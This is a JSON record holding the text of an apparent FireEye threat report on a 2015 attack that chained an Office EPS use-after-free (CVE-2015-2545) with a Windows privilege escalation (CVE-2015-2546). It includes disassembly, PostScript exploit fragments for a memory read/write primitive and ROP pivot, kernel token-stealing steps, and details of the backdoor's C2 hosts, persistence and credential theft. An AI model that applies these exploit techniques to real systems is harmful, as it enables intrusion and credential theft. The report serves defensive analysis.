{
    "id": "51fabbe5-7c99-48e4-b501-7ea9759f3c4a",
    "created_at": "2022-10-25T16:48:13.418816Z",
    "updated_at": "2025-03-27T02:05:48.792757Z",
    "deleted_at": null,
    "sha1_hash": "25aa281300e73d4eee57527c39764f8c22082ea7",
    "title": "Microsoft Word - FireEye_letterhead_v1.docx",
    "authors": "",
    "file_creation_date": "2015-09-08T20:29:12Z",
    "file_modification_date": "2015-09-08T20:29:12Z",
    "file_size": 1709751,
    "plain_text": "# Two for One: Microsoft Office Encapsulated PostScript and Windows Privilege Escalation Zero-Days\n\n### FireEye recently uncovered an attack exploiting two previously unknown vulnerabilities, one in Microsoft Office (CVE-2015-2545) and another in Windows (CVE-2015-2546). Both vulnerabilities are patched this Tuesday because of Microsoft’s immediate response.\n The attackers hid the exploit within a Microsoft Word document (.docx) that appeared to be a resume. The combination of these two exploits grant fully privileged remote code execution.\n FireEye products and services identify this activity as Exploit.Downloader.docx.MVX, Malware.Binary.Docx, GINGERSNAP, and RUBYVINE within the user interfaces.\n\n# Attack Overview\n\n### The malicious document first gets control of the WINWORD.EXE process from within PostScript (PS) in an Encapsulated PostScript (EPS) file. This includes triggering CVE-2015-2545 in EPSIMP32.FLT, searching memory for gadgets, and pivoting to ROP. ROP marks the shellcode stage as executable via Kernel32!VirtualProtect, and executes it.\n The shellcode stage loads a DLL that contains an exploit for CVE-2015-2546. The exploit elevates privileges of the current process to SYSTEM. As SYSTEM, the exploit injects a thread into explorer.exe that downloads a DLL from the attackers server and runs it with rundll32.exe. \n The downloaded DLL decompresses, decodes, and drops to disk another DLL with the name adiecl.dll, which performs the following actions:\n\n## 1. Checks \r network \r connectivity \r by \r querying \r major \r search \r engines: \r Google, \r Baidu, \r \n Yahoo, \r or \r Hotmail \r  2. Runs \r only \r during \r office \r hours \r (configurable) \r and \r if \r the \r OS \r version \r is \r Microsoft \r XP \r \n or \r higher \r  3. The \r backdoor \r is \r added \r as \r a \r Winlogon \r Fake \r Notification \r Package \r to \r be \r loaded \r as \r \n soon \r as \r the \r victim \r logs \r on \r to \r the \r system \r  4. Pulls \r commands \r from \r a \r list \r of \r compromised \r websites \r  5. Uses \r a \r symmetric \r key \r and \r custom \r encoding \r to \r send \r and \r receive \r data \r over \r the \r \n network \r  6. Stores \r the \r infection \r status \r as \r well \r as \r the \r configuration \r details \r in \r an \r encoded \r \n configuration \r file \r with \r the \r name \r apm.dat \r  7. Impersonates \r the \r logged \r on \r user \r to \r steal \r credentials \r  8. Installs \r as \r a \r Service \r if \r requested \r with \r the \r following \r names: \r \n a. Runtime \r Agent \r for \r Adobe \r Reader \r 9 \r  b. Windows \r P2P \r Tunneling \r Service \r  \r  c. User \r Search \r  9. Deletes \r itself \r if \r expiration \r date \r is \r exceeded \r \n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n# CVE-2015-2545 – Encapsulated PostScript (EPS) forall Use- After-Free (UAF) Exploit\n\n### The EPS exploit applies modern exploitation techniques to PostScript. Particularly, the exploit forges PostScript objects by allocating strings over freed objects in a use-after-free situation. Much like Flash exploits would corrupt Flash vectors to read/write out of bounds in the heap and loaded modules, this exploit forges a PostScript string object with size 0x7fffffff. Similarly, as Flash exploits would corrupt Flash objects to redirect function table dereferences, this exploit does so with a forged PostScript file object. CVE-2015-2545 Details CVE-2015-2545 is a use-after-free vulnerability in forall enumeration in Encapsulated PostScript (EPS). \n Encapsulated PostScript (EPS) is a DSC-conforming PostScript document with additional restrictions that is intended to be used as a graphics file format. EPS files are typically self- contained and predictable.[1] In this attack, a malicious EPS file is embedded within a Microsoft Office document.\n To perform a set of operations on members of an enumerable PostScript object, such as an array or a string, EPS defines a forall operator that takes an array and a procedure as operands. The procedure is performed on each member of the array.\n “If the first operand is a dictionary, forall pushes a key and a value on the operand stack and executes proc for each key-value pair in the dictionary. The order in which forall enumerates the entries in the dictionary is arbitrary. New entries put in the dictionary during execution of proc may or may not be included in the enumeration.”[2]\n The following disassembly demonstrates the aforementioned logic—please note that there is a ptrNext pointer pointing to the next key-value pair in the dictionary. Within the deferred_exec function call, the exploit deletes the rest of the key-value pairs in the dictionary, and thus implicitly corrupts the ptrNext value. During the next iteration, ptrNext points to attacker controlled data, resulting in malicious program execution.\n\n1002C64C \r loc_1002C64C:\n1002C64C \r  \r cmp \r  \r  \r  \r  \r eax, \r ebx\n1002C64E \r  \r jz \r  \r  \r  \r  \r  \r short \r loc_1002C6A0\n1002C650 \r  \r lea \r  \r  \r  \r  \r eax, \r [ebp+var_48]\n1002C653 \r  \r push \r  \r  \r  \r eax\n1002C654 \r  \r lea \r  \r  \r  \r  \r eax, \r [ebp+elements]\n1002C657 \r  \r push \r  \r  \r  \r eax\n1002C658 \r  \r lea \r  \r  \r  \r  \r eax, \r [ebp+ptrNext] \r  \r  \r ; \r ptrNext \r initialized \r as \r -­‐1\n1002C65B \r  \r push \r  \r  \r  \r eax\n1002C65C \r  \r lea \r  \r  \r  \r  \r ecx, \r [esi+30h]\n1002C65F \r  \r call \r  \r  \r  \r get_userdict_pair\n1002C664 \r  \r lea \r  \r  \r  \r  \r eax, \r [ebp+elements]\n\n1 https://en.wikipedia.org/wiki/Encapsulated_PostScript\n2 http://www-cdf.fnal.gov/offline/PostScript/PLRM2.pdf\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n1002C667 \r  \r push \r  \r  \r  \r eax\n1002C668 \r  \r mov \r  \r  \r  \r  \r ecx, \r edi\n1002C66A \r  \r call \r  \r  \r  \r store_to_stack\n1002C66F \r  \r lea \r  \r  \r  \r  \r eax, \r [ebp+var_48]\n1002C672 \r  \r push \r  \r  \r  \r eax\n1002C673 \r  \r mov \r  \r  \r  \r  \r ecx, \r edi\n1002C675 \r  \r call \r  \r  \r  \r store_to_stack\n1002C67A \r  \r mov \r  \r  \r  \r  \r ecx, \r [ebp+pXxxObj]\n1002C67D \r  \r lea \r  \r  \r  \r  \r eax, \r [ebp+proc]\n1002C680 \r  \r push \r  \r  \r  \r eax\n1002C681 \r  \r call \r  \r  \r  \r deferred_exec\n1002C686 \r  \r mov \r  \r  \r  \r  \r eax, \r [ebp+ptrNext] \r  \r  \r  \r ; \r freed \r item \r pointer\n1002C689 \r  \r jmp \r  \r  \r  \r  \r short \r loc_1002C64C\n**Figure \r 1 \r forall \r operator \r disassembly**\n\n### Forged PostScript Objects The EPS interpreter manipulates entities called PostScript objects. Some objects are data, such as numbers, booleans, strings, and arrays. Other objects are elements of programs to be executed, such as names, operators, and procedures. PostScript objects in memory usually have the structure shown in Figure 2.\n\nstruct \r PostScript \r object \r {\ndword \r  \r  \r type;\ndword \r  \r  \r attr;\ndword \r  \r  \r value1;\ndword \r  \r  \r value2; \r  \r  \r  \r  \r // \r if \r array, \r point \r to \r userdict \r where \r store \r the \r array \r object\n} \r ps_obj;\n**Figure \r 2 \r PostScript \r Object \r Struct**\n\n### A user-defined dictionary has the structure shown in Figure 3. \nstruct \r {\ndword \r * \r pNext; \r  \r // \r or \r null\ndword \r  \r  \r dwIndex;\nps_obj \r  \r key;\nps_obj \r  \r value;\n} \r kv;\n**Figure \r 3 \r User-­‐defined \r Dictionary \r Struct**\n\n### With these structs in mind, a dictionary defined as in Figure 4 is present in memory as shown in Figure 5.\n\n/aDictZ \r 3 \r dict \r def\naDictZ \r begin\n/keyZ1 \r [11] \r def\n/keyZ2 \r 16#100000 \r array \r def\n/keyZ3 \r [13] \r def\naDictZ \r end\n**Figure \r 4 \r Dictionary \r definition**\n\n039b8870 \r  \r 03a02148 \r 03a02178 \r 03a021a8 \r 00000000 \r user \r dict\n\n0:000> \r d \r 03a02148 \r la\n03a02148 \r  \r 00000000 \r 000002b4 \r 00000300 \r 00000000\n03a02158 \r  \r 039ddc78 \r 04426b34 \r 00030000 \r 00000000\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n03a02168 \r  \r 04421698 \r 039e5e54\n0:000> \r da \r 039ddc78\n039ddc78 \r  \r \"keyZ1\"\n\n0:000> \r dd \r 03a02178 \r la\n03a02178 \r  \r 00000000 \r 000002b5 \r 00000300 \r 00000000\n03a02188 \r  \r 039ddca8 \r 04426b40 \r 00030000 \r 00000000\n03a02198 \r  \r 039dcb58 \r 039e5e5c\n0:000> \r da \r 039ddca8\n039ddca8 \r  \r \"keyZ2\"\n\n0:000> \r dd \r 03a021a8 \r la\n03a021a8 \r  \r 00000000 \r 000002b6 \r 00000300 \r 00000000\n03a021b8 \r  \r 039ddcd8 \r 04426b4c \r 00030000 \r 00000000\n03a021c8 \r  \r 04421698 \r 039e5e64\n0:000> \r da \r 039ddcd8\n039ddcd8 \r  \r \"keyZ3\"\n**Figure \r 5 \r Dictionary \r in \r memory**\n\n### Within the forall procedure, the exploit frees the second and third objects from the dictionary, and allocates a new string object in their place. It writes data for a fake object into the new string (in the example below, to create a fake integer). Then, in the next iteration, the iterator receives a forged object from the interpreter consisting of the attacker-supplied data.\n First, the exploit uses this to leak a pointer to an object, as shown in Figure 6. \n/st1 \r 35 \r string \r def \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r % \r op_string \r will \r allocate \r 3 \r buffers\n% \r // \r after \r setup\n% \r 0:000> \r dd \r 03a32f98 \r lc\n% \r 03a32f98 \r  \r 677253dc \r 00000000 \r 00000000 \r 00000000\n% \r 03a32fa8 \r  \r 00000000 \r 00000001 \r 00000000 \r 00000000\n% \r 03a32fb8 \r  \r 04421308 \r 039e5e68 \r 00000000 \r 00000023 \r // \r 35 \r length \r string\n% \r 0:000> \r d \r 039e5e68 \r l4\n% \r 039e5e68 \r  \r 03a021a8 \r 00000000 \r 00000000 \r 00000000\n% \r 0:000> \r d \r 03a021a8 \r l28/4 \r  \r  \r // \r alloc \r @ \r keyZ3\n% \r 03a021a8 \r  \r 67723f24 \r 039e5e68 \r 00000000 \r 00000000\n% \r 03a021b8 \r  \r 00000000 \r 00000007 \r 00000000 \r 00000000\n% \r 03a021c8 \r  \r 03a02178 \r 00000024 \r  \r // \r +1 \r null \r char\n% \r 0:000> \r d \r 03a02178 \r l24/4+1 \r // \r alloc \r @ \r keyZ2\n% \r 03a02178 \r  \r 00000000 \r 000003ff \r 00000003 \r 00000000 \r  \r  \r  \r // \r keyZ2.key \r becomes \r a \r integertype\n% \r 03a02188 \r  \r 00000000 \r 41414141 \r 00000003 \r 00000000\n% \r 03a02198 \r  \r 00000000 \r 039e5e5c \r  \r // \r leaked \r pointer\n**Figure \r 6 \r String \r operator**\n\n### Full Read and Write Primitive Development Having already developed the UAF to forge limited objects that dereference and/or leak data, the exploit writes fake data to memory as shown in Figure 7.\n% \r 0:000> \r d \r 04421308+0n428\n% \r 044214b4 \r  \r 044214bc \r 044214ec \r cafebabe \r 41414141 \r  \r ..B...B.....AAAA\n% \r 044214c4 \r  \r 41414141 \r 41414141 \r 41414141 \r 00000003 \r  \r AAAAAAAAAAAA....\n% \r 044214d4 \r  \r 41414141 \r 41414141 \r 41414141 \r 044214b8 \r  \r AAAAAAAAAAAA..B.\n% \r 044214e4 \r  \r 00000000 \r 7fffffff \r cafebabe \r 41414141 \r  \r ............AAAA\n% \r 044214f4 \r  \r 41414141 \r 41414141 \r 41414141 \r 41414141 \r  \r AAAAAAAAAAAAAAAA\n% \r 04421504 \r  \r 41414141 \r 41414141 \r 00000000 \r 7fffffff \r  \r AAAAAAAA........\n% \r 04421514 \r  \r 00030234 \r 00020278 \r 74737900 \r 32336d65 \r  \r 4...x....ystem32\n% \r 04421524 \r  \r 6e69575c \r 73776f64 \r 65776f50 \r 65685372 \r  \r \\WindowsPowerShe\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\nImageCurve \r 428 \r colortoned \r 436 \r add2 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r 16#FF \r and \r put\nImageCurve \r 429 \r colortoned \r 436 \r add2 \r -­‐8 \r  \r bitshift \r 16#FF \r and \r put\nImageCurve \r 430 \r colortoned \r 436 \r add2 \r -­‐16 \r bitshift \r 16#FF \r and \r put\nImageCurve \r 431 \r colortoned \r 436 \r add2 \r -­‐24 \r bitshift \r 16#FF \r and \r put\nImageCurve \r 432 \r colortoned \r 484 \r add2 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r 16#FF \r and \r put\nImageCurve \r 433 \r colortoned \r 484 \r add2 \r -­‐8 \r  \r bitshift \r 16#FF \r and \r put\nImageCurve \r 434 \r colortoned \r 484 \r add2 \r -­‐16 \r bitshift \r 16#FF \r and \r put\nImageCurve \r 435 \r colortoned \r 484 \r add2 \r -­‐24 \r bitshift \r 16#FF \r and \r put\nImageCurve \r 436 \r <BE \r BA \r FE \r CA> \r putinterval\nImageCurve \r 440 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 444 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 448 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 452 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 456 \r <03 \r 00 \r 00 \r 00> \r putinterval\nImageCurve \r 460 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 464 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 468 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 472 \r colortoned \r 432 \r add2 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r 16#FF \r and \r put\nImageCurve \r 473 \r colortoned \r 432 \r add2 \r -­‐8 \r  \r bitshift \r 16#FF \r and \r put\nImageCurve \r 474 \r colortoned \r 432 \r add2 \r -­‐16 \r bitshift \r 16#FF \r and \r put\nImageCurve \r 475 \r colortoned \r 432 \r add2 \r -­‐24 \r bitshift \r 16#FF \r and \r put\nImageCurve \r 476 \r <00 \r 00 \r 00 \r 00> \r putinterval\nImageCurve \r 480 \r <FF \r FF \r FF \r 7F> \r putinterval\nImageCurve \r 484 \r <BE \r BA \r FE \r CA> \r putinterval\nImageCurve \r 488 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 492 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 496 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 500 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 504 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 508 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 512 \r <41 \r 41 \r 41 \r 41> \r putinterval\nImageCurve \r 516 \r <00 \r 00 \r 00 \r 00> \r putinterval\nImageCurve \r 520 \r <FF \r FF \r FF \r 7F> \r putinterval\n**Figure \r 7 \r Prepare \r Data**\n\n### It converts the data to a string type, with its base field set to 0 and length field set to 0x7fffffff. The string can then be used from PostScript to access the entire process space as seen in Figure 8.\n\ncolortonee \r type \r /stringtype \r eq \r { \r exit \r } \r if\n% \r whole \r memory \r read/write \r primitive\n% \r 0:000> \r d \r poi(044214b4 \r ) \r lc\n% \r 044214bc \r  \r cafebabe \r 41414141 \r 41414141 \r 41414141\n% \r 044214cc \r  \r 41414141 \r 00000003 \r 41414141 \r 41414141\n% \r 044214dc \r  \r 41414141 \r 044214b8 \r 00000000 \r 7fffffff\n% \r 0:000> \r d \r poi(044214b8 \r ) \r la\n% \r 044214ec \r  \r cafebabe \r 41414141 \r 41414141 \r 41414141\n% \r 044214fc \r  \r 41414141 \r 41414141 \r 41414141 \r 41414141\n% \r 0442150c \r  \r 00000000 \r 7fffffff \r  \r  \r  \r  \r  \r  \r  \r <-­‐-­‐-­‐ \r base \r 0, \r length \r 7fffffff\n**Figure \r 8 \r Read \r and \r Write \r Primitive**\n\n### Return-Oriented Programming The exploit searches memory for gadgets by using built-in string operations on the forged string. Once the ROP chain is written into memory, the exploit forges a file type object with the\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n### bytesavailable function pointer changed to point to the pivot. Finally, the exploit calls the bytesavailable function of the forged object (Figure 9), causing the EPS interpreter to pivot to the ROP chain.\n\ncanvas1 \r type \r /filetype \r eq \r {\n1 \r 1 \r atan\npop\n1 \r sin\npop\ncanvas1 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r % \r put \r forged \r filetype \r to \r operand \r stack\nbytesavailable \r  \r  \r  \r  \r  \r  \r  \r  \r % \r pivot \r to \r ROP\npop\n1 \r cos\npop\nexit\n} \r if\n**Figure \r 9 \r Pivot \r to \r ROP \r with \r forged \r object**\n\n# Shellcode\n\n### Once the ROP chain transfers control to the shellcode, the shellcode loads a DLL that exploits CVE-2015-2546 to elevate the process (see next section for details). As SYSTEM, the shellcode injects a remote thread into explorer.exe and returns execution to WINWORD.\n The thread in explorer.exe then downloads and executes a DLL payload from the attacker’s server.\n\n# CVE-2015-2546 – tagPOPUPMENU Use-After-Free (UAF) Privilege Escalation Exploit\n\n### The attack contains embedded DLLs that elevate the current process to SYSTEM privileges by exploiting CVE-2015-2546. The two DLLs exploit the same vulnerability, but target either 32-bit or 64-bit Windows. The vulnerability exists in most versions of Windows, but these exploits target Windows 7 (and do not bypass Supervisor Mode Execution Protection (SMEP)). CVE-2015-2546 Details This is a traditional usermode callback UAF vulnerability. The root cause and exploitation techniques used are similar to the vulnerability CVE-2015-0057.\n Within the vulnerable routine, xxxSendMessage initiates a user-mode callback. Through this callback, the attacker destroys the window and replaces the previously allocated structure with a maliciously crafted object. When the callback returns to the kernel, the vulnerable routine does not perform any validation of the dereferenced object. This results in the kernel trusting the malicious object, leading to elevation of privileges. Exploitation Steps 1. Using the popular User32!gSharedInfo / CLIENTINFO.ulClientDelta kernel information disclosure techniques, forge a tagWND object in user mode that contains the WFSERVERSIDEPROC status flag. When set, WFSERVERSIDEPROC causes the kernel to trust the pwnd->lpfnWndProc function by default. (Please note, symbol \"User32!gSharedInfo\" only available for Windows 7 and later)\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n### 2. Allocate large numbers of contiguous kernel memory by calling the routine win32k!NtUserCreateAcceleratorTable. The usermode program can specify the size of tagACCELTABLE structures, so the attacker chooses the same size as the targeted tagPOPUPMENU structures.\n 3. Based on the gSharedInfo information disclosure trick, locate and free one or more tagACCELTABLE structures to create holes.\n 4. Allocate tagPOPUPMENU structures by calling the routine CreateWindowEx(Menu class is equal 0x8000). The heap will allocate this structure into one of the holes from step 3 as seen below:\n\n1: \r kd> \r dd \r fdef1160\nfdef1160 \r  \r 00070182 \r 00000000 \r 00000000 \r 00000005\nfdef1170 \r  \r 00000000 \r 00000000 \r 00000000 \r 00000000 \r tagACCELTABLE \r object\nfdef1180 \r  \r 00000000 \r 00000000 \r 00000080 \r 00000000\nfdef1190 \r  \r fdef1254 \r 89758030 \r 56080008 \r 63617355\n-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐ \r  \r -­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐\nfdef11a0 \r  \r 0008010a \r 00000000 \r 00000000 \r 00000005\nfdef11b0 \r  \r 00000000 \r 00000000 \r 00000000 \r 00000000 \r tagACCELTABLE \r object\nfdef11c0 \r  \r 00000000 \r 00000000 \r 00000080 \r 00000000\nfdef11d0 \r  \r 0002001e \r 89758030 \r 56080008 \r 6d707355\n-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐ \r  \r -­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐\nfdef11e0 \r  \r 00000000 \r 00000000 \r fea12af0 \r 00000000\nfdef11f0 \r  \r 00000000 \r 00000000 \r 00000000 \r 00000000 \r tagPOPUPMENU \r object \r *\nfdef1200 \r  \r 00000000 \r 00000000 \r ffffffff \r 00000000\nfdef1210 \r  \r 000201a8 \r 89758030 \r 56080008 \r 63617355\n-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐ \r  \r -­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐-­‐\nfdef1220 \r  \r 00050196 \r 00000000 \r 00000000 \r 00000005\nfdef1230 \r  \r 00000000 \r 00000000 \r 00000000 \r 00000000 \r tagACCELTABLE \r object\nfdef1240 \r  \r 00000000 \r 00000000 \r 00000080 \r 00000000\nfdef1250 \r  \r 00010138 \r 89758030 \r 46990008 \r 20626747\n\n### 5. Within the vulnerable routine, xxxSendMessage(MN_SETTIMERTOOPENHIERARCHY) initiates a user-mode callback. Through this callback, the attacker destroys the window, which frees a block of memory. Related pseudocode is as follows:\n\nVOID \r FreePopup(PPOPUPMENU \r ppopupmen)\n{\n......\nValidateppopupmenu(ppopupmen);\nUserFreePool(ppopupmen);\n......\n}\n\n### 6. Before returning to the vulnerable routine in kernel mode, the attacker will invoke win32k!NtUserCreateAcceleratorTable again (in user mode). This action will occupy the kernel memory previously freed with a new tagACCELTABLE structure, replacing the previously allocated tagPOPUPMENU structure.\n 7. When the user-mode callback returns to the kernel, the vulnerable routine does not perform any validation of the dereferenced object. This results in the kernel trusting the malicious object, leading to elevation of privileges.\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n### Elevation Procedure Once executing shellcode in kernel mode, the 32-bit exploit elevates the current process to SYSTEM privileges as follows:\n\n## 1. Stores \r the \r content \r of \r the \r Global \r Descriptor \r Table \r Register \r (GDTR) \r into \r writable \r \n page \r nt!_KUSER_SHARED_DATA \r 0xFFDF0000. \r \n\n 2. Find \r symbol \r nt!KiInitialPCR \r and \r then \r walks \r along \r _KPCR \r -­‐> \r _KPRCB \r -­‐> \r _ETHREAD \r \n -­‐> \r _EPROCESS \r -­‐> \r ActiveProcessLinks \r to \r SYSTEM \r Process. \r \n\n 3. Steal \r token \r from \r the \r SYSTEM.Token. \r \n\n### The logic of 64-bit shellcode, shown below in Figure 10, performs the same operations:\n\n**Figure \r 10 \r 64-­‐bit \r kernel \r mode \r shellcode**\n\n# Payload\n\n### First Stage The exploit downloads a payload DLL from the attacker’s server and loads it with the following command:\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\nrundll32.exe \r <random_name>,GetInstanceObjectEx \r -­‐t \r abcd8888\n\n### The \r payload \r DLL \r contains \r a \r second-­‐stage \r DLL \r encoded \r and \r LZNT1 \r compressed \r in \r the \r resource \r  section. \r Once \r unpacked, \r the \r payload \r DLL \r writes \r the \r second-­‐stage \r DLL \r (adiecl.dll \r  5f34be2e01b76e2902cc801a6156fdaf) \r to \r disk \r and \r runs \r it \r as \r follows:\n\nrundll32.exe \r adiecl.dll,GetInstanceObjectEx \r –t \r init\n\n### The –t parameter can has three options:\n\n## 1. init: \r Installs \r the \r DLL \r on \r the \r system, \r registry, \r and \r spawns \r multiple \r threads \r to \r start \r \n the \r backdoor \r  2. n: \r Checks \r to \r make \r sure \r it \r is \r running; \r otherwise, \r it \r restart \r the \r threads \r  3. ui: \r Creates \r an \r event \r but \r does \r not \r perform \r any \r other \r actions \r \n\n### The DLL checks if it is running in a debugger, and then proceeds to decode its configuration file (apm.dat).\n Configuration File The configuration file is obfuscated with a custom Base64 alphabet. An small example of this is shown in the table below. For full configurations, please review the appendix below.\n Encoded Decoded\n\n[FmMuZjAwO2oWfzVvXQ8?] [configuration]\nJnghci0DJ3USCw?? = RDh0MGFmfS1AMlw? StartTime=1440813579\n\n### The configuration file also contains the hours in which the malware should run (based on the local time of the infected machine) as the following shows:\n\nofficeStart=06:00\nofficeEnd=20:00\nsat=1\nsun=1\nexpiry=-­‐1\n\n### In this instance, the payload runs only between 6:00 to 20:00 from Monday to Friday and does not expire, but could be set to expire in a number of days.\n The malware checks Internet connectivity by attempting to access google.com, adobe.com, or baidu.com. If the payload receives a response of “HTTP 200 OK”, it picks a pollcommandsite from its configuration and connects to the server to retrieve commands:\n\npollcommandsite1=hXXp://nic.net46[.]net/login.php?user=seema\n\n### pollcommandsites are attacker-controlled servers. In this case, the attackers appear to have compromised the web server in question as evidenced by Figure 11. The owner of one of the C2 domains, nic.net46[.].net, complains that the domain resolves to the wrong IP:\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n|Encoded|Decoded|\n|---|---|\n|[FmMuZjAwO2oWfzVvXQ8?]|[configuration]|\n|Jnghci0DJ3USCw?? = RDh0MGFmfS1AMlw?|StartTime=1440813579|\n\n\n-----\n\n**Figure \r 11 \r Compromised \r infrastructure**\n\n### The attacker’s server sends commands to the client in the following format:\n\n<size-­‐4bytes><unk-­‐4bytes><unk-­‐2bytes><command_4bytes><command_content>\n\n### Then, the backdoor connect to each of the slpSites in the configuration. One, if not all three, of which is a compromised website:\n\n slpSite1=190.96.47[.]9 slpSite2=103.13.228[.]132                        slpSite3=180.149.240[.]159\n The backdoor sends a POST Request to each slpSite as follows:\n\nPOST \r / \r HTTP/1.1\nAccept: \r */*\nUser-­‐Agent: \r Mozilla/4.0 \r (compatible)\nHost: \r 103.13.228[.]132\nContent-­‐Length: \r 24\nConnection: \r Keep-­‐Alive\nCache-­‐Control: \r no-­‐cache\n\nud7LDjtsTHe2tWeC8DYo8A**\n\nHTTP/1.1 \r 200 \r OK\nDate: \r Fri, \r 04 \r Sep \r 2015 \r 11:15:01 \r GMT\nServer: \r Apache/2.2.15 \r (CentOS) \r DAV/2\nSet-­‐Cookie: \r PHPSESSID=vt18kncl6emcfl3him7qn5rsr1;\nContent-­‐Length: \r 7713\nConnection: \r close\nContent-­‐Type: \r text/html;\ncharset=UTF-­‐8\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n\n-----\n\n<!DOCTYPE \r html> \r <head> \r  \r  \r  \r  \r <meta \r charset=\"utf-­‐8\"> \r  \r  \r  \r  \r <meta \r http-­‐equiv=\"X-­‐UA-­‐Compatible\n<truncated>\n\n### The User-Agent is hard-coded. The HTTP POST data contains a token for authentication to the server. After the above request, the backdoor sends a second POST with the same authentication token. Additional Behavior The backdoor grabs the explorer access token, impersonates the logged-on user, enumerates network credentials via the CredEnumerateA API, and eventually decrypts passwords (Generic Type) via the CryptUnprotectData API.\n The malware is renamed after a reboot from adiecl.dll to apm.dll via registry:\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\SESSION \r MANAGER\\\"PendingFileRenameOperations\" \r =\n\\??\\C:\\Program \r Files\\Adobe\\Reader\\9.0\\Dis\\adiecl.dll\\0\\??\\C:\\Program \r Files\\Adobe\\Reader\\9.0\\Dis\\apm.dll\\0\\0\n\n### Finally, the backdoor is added as a Winlogon Fake Notification Package in order to be loaded as soon as the victim logs into the system:\n\nSOFTWARE\\Microsoft\\Windows \r NT\\CurrentVersion\\Winlogon\\Notify\\ATIExfba32\n\n|hKey \r = \r HKEY_LOCAL_MACHINE\n|Subkey \r = \r \"SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\Notify\\ATIExfba32pHandle \r = \r 0007F9DC\n\nAsynchronous: \r 1\nDllName: \r C:\\Program \r Files\\Adobe\\Reader\\9.0\\Dis\\apm.dll\nImpersonate: \r 0\nStartup: \r WSE\n\n# Related Malware\n\n### We’ve uncovered four payloads attributable to this threat actor:\nCorrupted sample, mstun32.exe\nMD5 508ea46e6fdd70713bb4003b467004ef\nSHA-­‐1 d9f311342ea71741e9dfe96628b57e89c0e2ad0d\nSHA-­‐256 7a227a0815b7f4ca36450df7fd902d9a25fecab4c8ab7a32967296c679938844\nCompile 2009-­‐12-­‐17T01:17:22Z\nOn VT 2012-­‐03-­‐16 19:22:50\n\nP2P tunnel service fake, p2ptun.exe\nMD5 b0121ef3440e37599d73a4895cb3499f\nSHA-­‐1 93eee408ede32869c1aa5db77bc16736cecda588\nSHA-­‐256 f5e75df088cc2ffe7e635c83549998d41d84762614ccc2fa5e03148aee38e256\nCompile 2010-­‐09-­‐28T02:14:01Z\nOn VT 2013-­‐07-­‐25 23:19:43\nStage 2 DLL\nMD5 4365918ea8f1d4764bc1695be5e1de55\nSHA-­‐1 53854605cfb9788f47b99b4e26231f2b19246ff6\nSHA-­‐256 814c8e7b200451352d07dc62a5e1003b41b6264c279d7a68cf63c62d7b0630e6\nCompile 2010-­‐09-­‐28T02:14:01Z\n\n1440 McCarthy Boulevard **tel 408 321 6300 | fax 408 321 9818**\n\n|We’ve uncovered four payloads attributable to this threat actor:|Col2|\n|---|---|\n|Corrupted sample, mstun32.exe||\n|MD5|508ea46e6fdd70713bb4003b467004ef|\n|SHA-­‐1|d9f311342ea71741e9dfe96628b57e89c0e2ad0d|\n|SHA-­‐256|7a227a0815b7f4ca36450df7fd902d9a25fecab4c8ab7a32967296c679938844|\n|Compile|2009-­‐12-­‐17T01:17:22Z|\n|On VT|2012-­‐03-­‐16 19:22:50|\n\n|P2P tunnel service fake, 